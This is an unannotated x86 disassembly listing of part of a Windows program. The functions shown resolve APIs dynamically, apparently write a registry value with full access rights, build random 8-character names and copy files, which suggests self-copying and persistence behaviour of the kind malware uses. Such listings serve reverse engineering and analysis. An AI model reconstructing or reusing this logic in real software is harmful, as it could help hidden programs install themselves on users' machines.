  402779:	5d                   	pop    %ebp
  40277a:	c2 04 00             	ret    $0x4
  40277d:	cc                   	int3
  40277e:	cc                   	int3
  40277f:	cc                   	int3
  402780:	55                   	push   %ebp
  402781:	8b ec                	mov    %esp,%ebp
  402783:	6a 02                	push   $0x2
  402785:	8b 45 08             	mov    0x8(%ebp),%eax
  402788:	50                   	push   %eax
  402789:	ff 15 68 91 40 00    	call   *0x409168
  40278f:	f7 d8                	neg    %eax
  402791:	1b c0                	sbb    %eax,%eax
  402793:	83 c0 01             	add    $0x1,%eax
  402796:	5d                   	pop    %ebp
  402797:	c2 04 00             	ret    $0x4
  40279a:	cc                   	int3
  40279b:	cc                   	int3
  40279c:	cc                   	int3
  40279d:	cc                   	int3
  40279e:	cc                   	int3
  40279f:	cc                   	int3
  4027a0:	55                   	push   %ebp
  4027a1:	8b ec                	mov    %esp,%ebp
  4027a3:	8b 45 08             	mov    0x8(%ebp),%eax
  4027a6:	50                   	push   %eax
  4027a7:	ff 15 6c 91 40 00    	call   *0x40916c
  4027ad:	33 c9                	xor    %ecx,%ecx
  4027af:	83 f8 ff             	cmp    $0xffffffff,%eax
  4027b2:	0f 95 c1             	setne  %cl
  4027b5:	8b c1                	mov    %ecx,%eax
  4027b7:	5d                   	pop    %ebp
  4027b8:	c2 04 00             	ret    $0x4
  4027bb:	cc                   	int3
  4027bc:	cc                   	int3
  4027bd:	cc                   	int3
  4027be:	cc                   	int3
  4027bf:	cc                   	int3
  4027c0:	55                   	push   %ebp
  4027c1:	8b ec                	mov    %esp,%ebp
  4027c3:	81 ec 1c 01 00 00    	sub    $0x11c,%esp
  4027c9:	c7 85 f4 fe ff ff 00 	movl   $0x0,-0x10c(%ebp)
  4027d0:	00 00 00 
  4027d3:	68 04 01 00 00       	push   $0x104
  4027d8:	6a 00                	push   $0x0
  4027da:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  4027e0:	50                   	push   %eax
  4027e1:	e8 2e 51 00 00       	call   0x407914
  4027e6:	83 c4 0c             	add    $0xc,%esp
  4027e9:	c7 85 e8 fe ff ff 00 	movl   $0x0,-0x118(%ebp)
  4027f0:	00 00 00 
  4027f3:	eb 0f                	jmp    0x402804
  4027f5:	8b 8d e8 fe ff ff    	mov    -0x118(%ebp),%ecx
  4027fb:	83 c1 01             	add    $0x1,%ecx
  4027fe:	89 8d e8 fe ff ff    	mov    %ecx,-0x118(%ebp)
  402804:	8b 95 e8 fe ff ff    	mov    -0x118(%ebp),%edx
  40280a:	3b 95 f8 fe ff ff    	cmp    -0x108(%ebp),%edx
  402810:	73 61                	jae    0x402873
  402812:	8b 85 e8 fe ff ff    	mov    -0x118(%ebp),%eax
  402818:	8b 8c 85 fc fe ff ff 	mov    -0x104(%ebp,%eax,4),%ecx
  40281f:	3b 4d 08             	cmp    0x8(%ebp),%ecx
  402822:	75 4d                	jne    0x402871
  402824:	8b 95 f8 fe ff ff    	mov    -0x108(%ebp),%edx
  40282a:	83 ea 01             	sub    $0x1,%edx
  40282d:	39 95 e8 fe ff ff    	cmp    %edx,-0x118(%ebp)
  402833:	73 2b                	jae    0x402860
  402835:	8b 85 e8 fe ff ff    	mov    -0x118(%ebp),%eax
  40283b:	8b 8d e8 fe ff ff    	mov    -0x118(%ebp),%ecx
  402841:	8b 94 8d 00 ff ff ff 	mov    -0x100(%ebp,%ecx,4),%edx
  402848:	89 94 85 fc fe ff ff 	mov    %edx,-0x104(%ebp,%eax,4)
  40284f:	8b 85 e8 fe ff ff    	mov    -0x118(%ebp),%eax
  402855:	83 c0 01             	add    $0x1,%eax
  402858:	89 85 e8 fe ff ff    	mov    %eax,-0x118(%ebp)
  40285e:	eb c4                	jmp    0x402824
  402860:	8b 8d f8 fe ff ff    	mov    -0x108(%ebp),%ecx
  402866:	83 e9 01             	sub    $0x1,%ecx
  402869:	89 8d f8 fe ff ff    	mov    %ecx,-0x108(%ebp)
  40286f:	eb 02                	jmp    0x402873
  402871:	eb 82                	jmp    0x4027f5
  402873:	33 d2                	xor    %edx,%edx
  402875:	0f 85 6e ff ff ff    	jne    0x4027e9
  40287b:	c7 85 e4 fe ff ff 00 	movl   $0x0,-0x11c(%ebp)
  402882:	00 00 00 
  402885:	eb 0f                	jmp    0x402896
  402887:	8b 85 e4 fe ff ff    	mov    -0x11c(%ebp),%eax
  40288d:	83 c0 01             	add    $0x1,%eax
  402890:	89 85 e4 fe ff ff    	mov    %eax,-0x11c(%ebp)
  402896:	8b 8d e4 fe ff ff    	mov    -0x11c(%ebp),%ecx
  40289c:	3b 8d f8 fe ff ff    	cmp    -0x108(%ebp),%ecx
  4028a2:	73 16                	jae    0x4028ba
  4028a4:	8b 95 e4 fe ff ff    	mov    -0x11c(%ebp),%edx
  4028aa:	8b 84 95 fc fe ff ff 	mov    -0x104(%ebp,%edx,4),%eax
  4028b1:	3b 45 08             	cmp    0x8(%ebp),%eax
  4028b4:	75 02                	jne    0x4028b8
  4028b6:	eb 02                	jmp    0x4028ba
  4028b8:	eb cd                	jmp    0x402887
  4028ba:	8b 8d e4 fe ff ff    	mov    -0x11c(%ebp),%ecx
  4028c0:	3b 8d f8 fe ff ff    	cmp    -0x108(%ebp),%ecx
  4028c6:	75 28                	jne    0x4028f0
  4028c8:	83 bd f8 fe ff ff 40 	cmpl   $0x40,-0x108(%ebp)
  4028cf:	73 1f                	jae    0x4028f0
  4028d1:	8b 95 e4 fe ff ff    	mov    -0x11c(%ebp),%edx
  4028d7:	8b 45 08             	mov    0x8(%ebp),%eax
  4028da:	89 84 95 fc fe ff ff 	mov    %eax,-0x104(%ebp,%edx,4)
  4028e1:	8b 8d f8 fe ff ff    	mov    -0x108(%ebp),%ecx
  4028e7:	83 c1 01             	add    $0x1,%ecx
  4028ea:	89 8d f8 fe ff ff    	mov    %ecx,-0x108(%ebp)
  4028f0:	33 d2                	xor    %edx,%edx
  4028f2:	75 87                	jne    0x40287b
  4028f4:	c7 85 ec fe ff ff 00 	movl   $0x0,-0x114(%ebp)
  4028fb:	00 00 00 
  4028fe:	c7 85 f0 fe ff ff 00 	movl   $0x0,-0x110(%ebp)
  402905:	00 00 00 
  402908:	8d 85 ec fe ff ff    	lea    -0x114(%ebp),%eax
  40290e:	50                   	push   %eax
  40290f:	6a 00                	push   $0x0
  402911:	6a 00                	push   $0x0
  402913:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  402919:	51                   	push   %ecx
  40291a:	8b 55 08             	mov    0x8(%ebp),%edx
  40291d:	52                   	push   %edx
  40291e:	ff 15 3c 91 40 00    	call   *0x40913c
  402924:	89 85 f4 fe ff ff    	mov    %eax,-0x10c(%ebp)
  40292a:	33 c0                	xor    %eax,%eax
  40292c:	83 bd f4 fe ff ff 00 	cmpl   $0x0,-0x10c(%ebp)
  402933:	0f 94 c0             	sete   %al
  402936:	8b e5                	mov    %ebp,%esp
  402938:	5d                   	pop    %ebp
  402939:	c2 04 00             	ret    $0x4
  40293c:	cc                   	int3
  40293d:	cc                   	int3
  40293e:	cc                   	int3
  40293f:	cc                   	int3
  402940:	55                   	push   %ebp
  402941:	8b ec                	mov    %esp,%ebp
  402943:	83 ec 08             	sub    $0x8,%esp
  402946:	e8 75 00 00 00       	call   0x4029c0
  40294b:	6a 00                	push   $0x0
  40294d:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402950:	50                   	push   %eax
  402951:	6a 00                	push   $0x0
  402953:	68 3f 01 0f 00       	push   $0xf013f
  402958:	6a 00                	push   $0x0
  40295a:	6a 00                	push   $0x0
  40295c:	6a 00                	push   $0x0
  40295e:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402961:	51                   	push   %ecx
  402962:	8b 55 08             	mov    0x8(%ebp),%edx
  402965:	52                   	push   %edx
  402966:	ff 15 6c d7 40 00    	call   *0x40d76c
  40296c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40296f:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  402973:	74 04                	je     0x402979
  402975:	32 c0                	xor    %al,%al
  402977:	eb 3c                	jmp    0x4029b5
  402979:	8b 45 14             	mov    0x14(%ebp),%eax
  40297c:	50                   	push   %eax
  40297d:	e8 dc 4f 00 00       	call   0x40795e
  402982:	83 c4 04             	add    $0x4,%esp
  402985:	50                   	push   %eax
  402986:	8b 4d 14             	mov    0x14(%ebp),%ecx
  402989:	51                   	push   %ecx
  40298a:	6a 01                	push   $0x1
  40298c:	6a 00                	push   $0x0
  40298e:	8b 55 10             	mov    0x10(%ebp),%edx
  402991:	52                   	push   %edx
  402992:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402995:	50                   	push   %eax
  402996:	ff 15 70 d7 40 00    	call   *0x40d770
  40299c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40299f:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  4029a3:	74 04                	je     0x4029a9
  4029a5:	32 c0                	xor    %al,%al
  4029a7:	eb 0c                	jmp    0x4029b5
  4029a9:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4029ac:	51                   	push   %ecx
  4029ad:	ff 15 74 d7 40 00    	call   *0x40d774
  4029b3:	b0 01                	mov    $0x1,%al
  4029b5:	8b e5                	mov    %ebp,%esp
  4029b7:	5d                   	pop    %ebp
  4029b8:	c3                   	ret
  4029b9:	cc                   	int3
  4029ba:	cc                   	int3
  4029bb:	cc                   	int3
  4029bc:	cc                   	int3
  4029bd:	cc                   	int3
  4029be:	cc                   	int3
  4029bf:	cc                   	int3
  4029c0:	55                   	push   %ebp
  4029c1:	8b ec                	mov    %esp,%ebp
  4029c3:	83 ec 08             	sub    $0x8,%esp
  4029c6:	68 64 98 40 00       	push   $0x409864
  4029cb:	ff 15 08 90 40 00    	call   *0x409008
  4029d1:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4029d4:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  4029d8:	74 3c                	je     0x402a16
  4029da:	68 74 98 40 00       	push   $0x409874
  4029df:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4029e2:	50                   	push   %eax
  4029e3:	ff 15 04 90 40 00    	call   *0x409004
  4029e9:	a3 6c d7 40 00       	mov    %eax,0x40d76c
  4029ee:	68 84 98 40 00       	push   $0x409884
  4029f3:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4029f6:	51                   	push   %ecx
  4029f7:	ff 15 04 90 40 00    	call   *0x409004
  4029fd:	a3 70 d7 40 00       	mov    %eax,0x40d770
  402a02:	68 94 98 40 00       	push   $0x409894
  402a07:	8b 55 f8             	mov    -0x8(%ebp),%edx
  402a0a:	52                   	push   %edx
  402a0b:	ff 15 04 90 40 00    	call   *0x409004
  402a11:	a3 74 d7 40 00       	mov    %eax,0x40d774
  402a16:	68 a0 98 40 00       	push   $0x4098a0
  402a1b:	ff 15 08 90 40 00    	call   *0x409008
  402a21:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402a24:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  402a28:	74 28                	je     0x402a52
  402a2a:	68 b0 98 40 00       	push   $0x4098b0
  402a2f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402a32:	50                   	push   %eax
  402a33:	ff 15 04 90 40 00    	call   *0x409004
  402a39:	a3 78 d7 40 00       	mov    %eax,0x40d778
  402a3e:	68 c0 98 40 00       	push   $0x4098c0
  402a43:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402a46:	51                   	push   %ecx
  402a47:	ff 15 04 90 40 00    	call   *0x409004
  402a4d:	a3 7c d7 40 00       	mov    %eax,0x40d77c
  402a52:	8b e5                	mov    %ebp,%esp
  402a54:	5d                   	pop    %ebp
  402a55:	c3                   	ret
  402a56:	cc                   	int3
  402a57:	cc                   	int3
  402a58:	cc                   	int3
  402a59:	cc                   	int3
  402a5a:	cc                   	int3
  402a5b:	cc                   	int3
  402a5c:	cc                   	int3
  402a5d:	cc                   	int3
  402a5e:	cc                   	int3
  402a5f:	cc                   	int3
  402a60:	55                   	push   %ebp
  402a61:	8b ec                	mov    %esp,%ebp
  402a63:	83 ec 08             	sub    $0x8,%esp
  402a66:	56                   	push   %esi
  402a67:	8b 45 08             	mov    0x8(%ebp),%eax
  402a6a:	50                   	push   %eax
  402a6b:	e8 ee 4e 00 00       	call   0x40795e
  402a70:	83 c4 04             	add    $0x4,%esp
  402a73:	8b f0                	mov    %eax,%esi
  402a75:	68 d4 98 40 00       	push   $0x4098d4
  402a7a:	e8 df 4e 00 00       	call   0x40795e
  402a7f:	83 c4 04             	add    $0x4,%esp
  402a82:	8d 4c 06 0a          	lea    0xa(%esi,%eax,1),%ecx
  402a86:	51                   	push   %ecx
  402a87:	ff 15 28 91 40 00    	call   *0x409128
  402a8d:	83 c4 04             	add    $0x4,%esp
  402a90:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402a93:	8b 55 08             	mov    0x8(%ebp),%edx
  402a96:	52                   	push   %edx
  402a97:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402a9a:	50                   	push   %eax
  402a9b:	e8 68 4e 00 00       	call   0x407908
  402aa0:	83 c4 08             	add    $0x8,%esp
  402aa3:	68 e0 98 40 00       	push   $0x4098e0
  402aa8:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  402aab:	51                   	push   %ecx
  402aac:	e8 b3 4e 00 00       	call   0x407964
  402ab1:	83 c4 08             	add    $0x8,%esp
  402ab4:	68 ec 98 40 00       	push   $0x4098ec
  402ab9:	8b 55 f8             	mov    -0x8(%ebp),%edx
  402abc:	52                   	push   %edx
  402abd:	ff 15 88 90 40 00    	call   *0x409088
  402ac3:	83 c4 08             	add    $0x8,%esp
  402ac6:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402ac9:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  402acd:	75 02                	jne    0x402ad1
  402acf:	eb 2b                	jmp    0x402afc
  402ad1:	8b 45 0c             	mov    0xc(%ebp),%eax
  402ad4:	50                   	push   %eax
  402ad5:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402ad8:	51                   	push   %ecx
  402ad9:	ff 15 b0 90 40 00    	call   *0x4090b0
  402adf:	83 c4 08             	add    $0x8,%esp
  402ae2:	8b 55 fc             	mov    -0x4(%ebp),%edx
  402ae5:	52                   	push   %edx
  402ae6:	ff 15 84 90 40 00    	call   *0x409084
  402aec:	83 c4 04             	add    $0x4,%esp
  402aef:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402af2:	50                   	push   %eax
  402af3:	ff 15 ac 90 40 00    	call   *0x4090ac
  402af9:	83 c4 04             	add    $0x4,%esp
  402afc:	5e                   	pop    %esi
  402afd:	8b e5                	mov    %ebp,%esp
  402aff:	5d                   	pop    %ebp
  402b00:	c3                   	ret
  402b01:	cc                   	int3
  402b02:	cc                   	int3
  402b03:	cc                   	int3
  402b04:	cc                   	int3
  402b05:	cc                   	int3
  402b06:	cc                   	int3
  402b07:	cc                   	int3
  402b08:	cc                   	int3
  402b09:	cc                   	int3
  402b0a:	cc                   	int3
  402b0b:	cc                   	int3
  402b0c:	cc                   	int3
  402b0d:	cc                   	int3
  402b0e:	cc                   	int3
  402b0f:	cc                   	int3
  402b10:	55                   	push   %ebp
  402b11:	8b ec                	mov    %esp,%ebp
  402b13:	83 ec 08             	sub    $0x8,%esp
  402b16:	56                   	push   %esi
  402b17:	8b 45 08             	mov    0x8(%ebp),%eax
  402b1a:	50                   	push   %eax
  402b1b:	e8 3e 4e 00 00       	call   0x40795e
  402b20:	83 c4 04             	add    $0x4,%esp
  402b23:	8b f0                	mov    %eax,%esi
  402b25:	68 f0 98 40 00       	push   $0x4098f0
  402b2a:	e8 2f 4e 00 00       	call   0x40795e
  402b2f:	83 c4 04             	add    $0x4,%esp
  402b32:	8d 4c 06 0a          	lea    0xa(%esi,%eax,1),%ecx
  402b36:	51                   	push   %ecx
  402b37:	ff 15 28 91 40 00    	call   *0x409128
  402b3d:	83 c4 04             	add    $0x4,%esp
  402b40:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402b43:	8b 55 08             	mov    0x8(%ebp),%edx
  402b46:	52                   	push   %edx
  402b47:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402b4a:	50                   	push   %eax
  402b4b:	e8 b8 4d 00 00       	call   0x407908
  402b50:	83 c4 08             	add    $0x8,%esp
  402b53:	68 fc 98 40 00       	push   $0x4098fc
  402b58:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  402b5b:	51                   	push   %ecx
  402b5c:	e8 03 4e 00 00       	call   0x407964
  402b61:	83 c4 08             	add    $0x8,%esp
  402b64:	68 08 99 40 00       	push   $0x409908
  402b69:	8b 55 f8             	mov    -0x8(%ebp),%edx
  402b6c:	52                   	push   %edx
  402b6d:	ff 15 88 90 40 00    	call   *0x409088
  402b73:	83 c4 08             	add    $0x8,%esp
  402b76:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402b79:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  402b7d:	75 02                	jne    0x402b81
  402b7f:	eb 2b                	jmp    0x402bac
  402b81:	8b 45 0c             	mov    0xc(%ebp),%eax
  402b84:	50                   	push   %eax
  402b85:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402b88:	51                   	push   %ecx
  402b89:	ff 15 b0 90 40 00    	call   *0x4090b0
  402b8f:	83 c4 08             	add    $0x8,%esp
  402b92:	8b 55 fc             	mov    -0x4(%ebp),%edx
  402b95:	52                   	push   %edx
  402b96:	ff 15 84 90 40 00    	call   *0x409084
  402b9c:	83 c4 04             	add    $0x4,%esp
  402b9f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402ba2:	50                   	push   %eax
  402ba3:	ff 15 ac 90 40 00    	call   *0x4090ac
  402ba9:	83 c4 04             	add    $0x4,%esp
  402bac:	5e                   	pop    %esi
  402bad:	8b e5                	mov    %ebp,%esp
  402baf:	5d                   	pop    %ebp
  402bb0:	c3                   	ret
  402bb1:	cc                   	int3
  402bb2:	cc                   	int3
  402bb3:	cc                   	int3
  402bb4:	cc                   	int3
  402bb5:	cc                   	int3
  402bb6:	cc                   	int3
  402bb7:	cc                   	int3
  402bb8:	cc                   	int3
  402bb9:	cc                   	int3
  402bba:	cc                   	int3
  402bbb:	cc                   	int3
  402bbc:	cc                   	int3
  402bbd:	cc                   	int3
  402bbe:	cc                   	int3
  402bbf:	cc                   	int3
  402bc0:	55                   	push   %ebp
  402bc1:	8b ec                	mov    %esp,%ebp
  402bc3:	83 ec 0c             	sub    $0xc,%esp
  402bc6:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  402bcd:	6a 00                	push   $0x0
  402bcf:	ff 15 98 90 40 00    	call   *0x409098
  402bd5:	83 c4 04             	add    $0x4,%esp
  402bd8:	50                   	push   %eax
  402bd9:	ff 15 c0 90 40 00    	call   *0x4090c0
  402bdf:	83 c4 04             	add    $0x4,%esp
  402be2:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  402be9:	eb 09                	jmp    0x402bf4
  402beb:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402bee:	83 c0 01             	add    $0x1,%eax
  402bf1:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402bf4:	83 7d fc 08          	cmpl   $0x8,-0x4(%ebp)
  402bf8:	7d 7a                	jge    0x402c74
  402bfa:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  402c01:	ff 15 bc 90 40 00    	call   *0x4090bc
  402c07:	99                   	cltd
  402c08:	b9 03 00 00 00       	mov    $0x3,%ecx
  402c0d:	f7 f9                	idiv   %ecx
  402c0f:	89 55 f4             	mov    %edx,-0xc(%ebp)
  402c12:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  402c16:	75 16                	jne    0x402c2e
  402c18:	ff 15 bc 90 40 00    	call   *0x4090bc
  402c1e:	99                   	cltd
  402c1f:	b9 0a 00 00 00       	mov    $0xa,%ecx
  402c24:	f7 f9                	idiv   %ecx
  402c26:	83 c2 30             	add    $0x30,%edx
  402c29:	89 55 f8             	mov    %edx,-0x8(%ebp)
  402c2c:	eb 36                	jmp    0x402c64
  402c2e:	83 7d f4 01          	cmpl   $0x1,-0xc(%ebp)
  402c32:	75 16                	jne    0x402c4a
  402c34:	ff 15 bc 90 40 00    	call   *0x4090bc
  402c3a:	99                   	cltd
  402c3b:	b9 1a 00 00 00       	mov    $0x1a,%ecx
  402c40:	f7 f9                	idiv   %ecx
  402c42:	83 c2 41             	add    $0x41,%edx
  402c45:	89 55 f8             	mov    %edx,-0x8(%ebp)
  402c48:	eb 1a                	jmp    0x402c64
  402c4a:	83 7d f4 02          	cmpl   $0x2,-0xc(%ebp)
  402c4e:	75 14                	jne    0x402c64
  402c50:	ff 15 bc 90 40 00    	call   *0x4090bc
  402c56:	99                   	cltd
  402c57:	b9 1a 00 00 00       	mov    $0x1a,%ecx
  402c5c:	f7 f9                	idiv   %ecx
  402c5e:	83 c2 61             	add    $0x61,%edx
  402c61:	89 55 f8             	mov    %edx,-0x8(%ebp)
  402c64:	8b 55 08             	mov    0x8(%ebp),%edx
  402c67:	03 55 fc             	add    -0x4(%ebp),%edx
  402c6a:	8a 45 f8             	mov    -0x8(%ebp),%al
  402c6d:	88 02                	mov    %al,(%edx)
  402c6f:	e9 77 ff ff ff       	jmp    0x402beb
  402c74:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402c77:	c6 41 08 00          	movb   $0x0,0x8(%ecx)
  402c7b:	b0 01                	mov    $0x1,%al
  402c7d:	8b e5                	mov    %ebp,%esp
  402c7f:	5d                   	pop    %ebp
  402c80:	c3                   	ret
  402c81:	cc                   	int3
  402c82:	cc                   	int3
  402c83:	cc                   	int3
  402c84:	cc                   	int3
  402c85:	cc                   	int3
  402c86:	cc                   	int3
  402c87:	cc                   	int3
  402c88:	cc                   	int3
  402c89:	cc                   	int3
  402c8a:	cc                   	int3
  402c8b:	cc                   	int3
  402c8c:	cc                   	int3
  402c8d:	cc                   	int3
  402c8e:	cc                   	int3
  402c8f:	cc                   	int3
  402c90:	55                   	push   %ebp
  402c91:	8b ec                	mov    %esp,%ebp
  402c93:	83 ec 14             	sub    $0x14,%esp
  402c96:	6a 00                	push   $0x0
  402c98:	8b 45 0c             	mov    0xc(%ebp),%eax
  402c9b:	50                   	push   %eax
  402c9c:	ff 15 c4 90 40 00    	call   *0x4090c4
  402ca2:	83 c4 08             	add    $0x8,%esp
  402ca5:	85 c0                	test   %eax,%eax
  402ca7:	75 07                	jne    0x402cb0
  402ca9:	b0 01                	mov    $0x1,%al
  402cab:	e9 b3 00 00 00       	jmp    0x402d63
  402cb0:	c7 45 ec 00 10 00 00 	movl   $0x1000,-0x14(%ebp)
  402cb7:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  402cba:	51                   	push   %ecx
  402cbb:	ff 15 28 91 40 00    	call   *0x409128
  402cc1:	83 c4 04             	add    $0x4,%esp
  402cc4:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402cc7:	68 0c 99 40 00       	push   $0x40990c
  402ccc:	8b 55 08             	mov    0x8(%ebp),%edx
  402ccf:	52                   	push   %edx
  402cd0:	ff 15 88 90 40 00    	call   *0x409088
  402cd6:	83 c4 08             	add    $0x8,%esp
  402cd9:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402cdc:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  402ce0:	74 1b                	je     0x402cfd
  402ce2:	68 10 99 40 00       	push   $0x409910
  402ce7:	8b 45 0c             	mov    0xc(%ebp),%eax
  402cea:	50                   	push   %eax
  402ceb:	ff 15 88 90 40 00    	call   *0x409088
  402cf1:	83 c4 08             	add    $0x8,%esp
  402cf4:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402cf7:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  402cfb:	75 04                	jne    0x402d01
  402cfd:	32 c0                	xor    %al,%al
  402cff:	eb 62                	jmp    0x402d63
  402d01:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402d04:	51                   	push   %ecx
  402d05:	8b 55 ec             	mov    -0x14(%ebp),%edx
  402d08:	52                   	push   %edx
  402d09:	6a 01                	push   $0x1
  402d0b:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402d0e:	50                   	push   %eax
  402d0f:	ff 15 8c 90 40 00    	call   *0x40908c
  402d15:	83 c4 10             	add    $0x10,%esp
  402d18:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402d1b:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  402d1f:	7e 19                	jle    0x402d3a
  402d21:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402d24:	51                   	push   %ecx
  402d25:	6a 01                	push   $0x1
  402d27:	8b 55 f8             	mov    -0x8(%ebp),%edx
  402d2a:	52                   	push   %edx
  402d2b:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402d2e:	50                   	push   %eax
  402d2f:	ff 15 80 90 40 00    	call   *0x409080
  402d35:	83 c4 10             	add    $0x10,%esp
  402d38:	eb c7                	jmp    0x402d01
  402d3a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402d3d:	51                   	push   %ecx
  402d3e:	ff 15 84 90 40 00    	call   *0x409084
  402d44:	83 c4 04             	add    $0x4,%esp
  402d47:	8b 55 f4             	mov    -0xc(%ebp),%edx
  402d4a:	52                   	push   %edx
  402d4b:	ff 15 84 90 40 00    	call   *0x409084
  402d51:	83 c4 04             	add    $0x4,%esp
  402d54:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402d57:	50                   	push   %eax
  402d58:	ff 15 ac 90 40 00    	call   *0x4090ac
  402d5e:	83 c4 04             	add    $0x4,%esp
  402d61:	b0 01                	mov    $0x1,%al
  402d63:	8b e5                	mov    %ebp,%esp
  402d65:	5d                   	pop    %ebp
  402d66:	c3                   	ret
  402d67:	cc                   	int3
  402d68:	cc                   	int3
  402d69:	cc                   	int3
  402d6a:	cc                   	int3
  402d6b:	cc                   	int3
  402d6c:	cc                   	int3
  402d6d:	cc                   	int3
  402d6e:	cc                   	int3
  402d6f:	cc                   	int3
  402d70:	55                   	push   %ebp
  402d71:	8b ec                	mov    %esp,%ebp
  402d73:	8b 45 08             	mov    0x8(%ebp),%eax
  402d76:	50                   	push   %eax
  402d77:	8b 0d 80 d7 40 00    	mov    0x40d780,%ecx
  402d7d:	51                   	push   %ecx
  402d7e:	e8 0d ff ff ff       	call   0x402c90
  402d83:	83 c4 08             	add    $0x8,%esp
  402d86:	0f b6 d0             	movzbl %al,%edx
  402d89:	85 d2                	test   %edx,%edx
  402d8b:	75 04                	jne    0x402d91
  402d8d:	32 c0                	xor    %al,%al
  402d8f:	eb 02                	jmp    0x402d93
  402d91:	b0 01                	mov    $0x1,%al
  402d93:	5d                   	pop    %ebp
  402d94:	c3                   	ret
  402d95:	cc                   	int3
  402d96:	cc                   	int3
  402d97:	cc                   	int3
  402d98:	cc                   	int3
  402d99:	cc                   	int3
  402d9a:	cc                   	int3
  402d9b:	cc                   	int3
  402d9c:	cc                   	int3
  402d9d:	cc                   	int3
  402d9e:	cc                   	int3
  402d9f:	cc                   	int3
  402da0:	55                   	push   %ebp
  402da1:	8b ec                	mov    %esp,%ebp
  402da3:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  402da7:	75 13                	jne    0x402dbc
  402da9:	68 14 99 40 00       	push   $0x409914
  402dae:	8b 45 08             	mov    0x8(%ebp),%eax
  402db1:	50                   	push   %eax
  402db2:	e8 a9 fc ff ff       	call   0x402a60
  402db7:	83 c4 08             	add    $0x8,%esp
  402dba:	eb 21                	jmp    0x402ddd
  402dbc:	68 28 99 40 00       	push   $0x409928
  402dc1:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402dc4:	51                   	push   %ecx
  402dc5:	e8 96 fc ff ff       	call   0x402a60
  402dca:	83 c4 08             	add    $0x8,%esp
  402dcd:	8b 55 10             	mov    0x10(%ebp),%edx
  402dd0:	52                   	push   %edx
  402dd1:	8b 45 08             	mov    0x8(%ebp),%eax
  402dd4:	50                   	push   %eax
  402dd5:	e8 86 fc ff ff       	call   0x402a60
  402dda:	83 c4 08             	add    $0x8,%esp
  402ddd:	68 48 99 40 00       	push   $0x409948
  402de2:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402de5:	51                   	push   %ecx
  402de6:	e8 25 fd ff ff       	call   0x402b10
  402deb:	83 c4 08             	add    $0x8,%esp
  402dee:	5d                   	pop    %ebp
  402def:	c3                   	ret
  402df0:	55                   	push   %ebp
  402df1:	8b ec                	mov    %esp,%ebp
  402df3:	e8 c8 fb ff ff       	call   0x4029c0
  402df8:	8b 45 08             	mov    0x8(%ebp),%eax
  402dfb:	83 38 00             	cmpl   $0x0,(%eax)
  402dfe:	74 5a                	je     0x402e5a
  402e00:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402e03:	8b 11                	mov    (%ecx),%edx
  402e05:	52                   	push   %edx
  402e06:	e8 53 4b 00 00       	call   0x40795e
  402e0b:	83 c4 04             	add    $0x4,%esp
  402e0e:	83 c0 01             	add    $0x1,%eax
  402e11:	50                   	push   %eax
  402e12:	ff 15 28 91 40 00    	call   *0x409128
  402e18:	83 c4 04             	add    $0x4,%esp
  402e1b:	a3 80 d7 40 00       	mov    %eax,0x40d780
  402e20:	8b 45 08             	mov    0x8(%ebp),%eax
  402e23:	8b 08                	mov    (%eax),%ecx
  402e25:	51                   	push   %ecx
  402e26:	e8 33 4b 00 00       	call   0x40795e
  402e2b:	83 c4 04             	add    $0x4,%esp
  402e2e:	83 c0 01             	add    $0x1,%eax
  402e31:	50                   	push   %eax
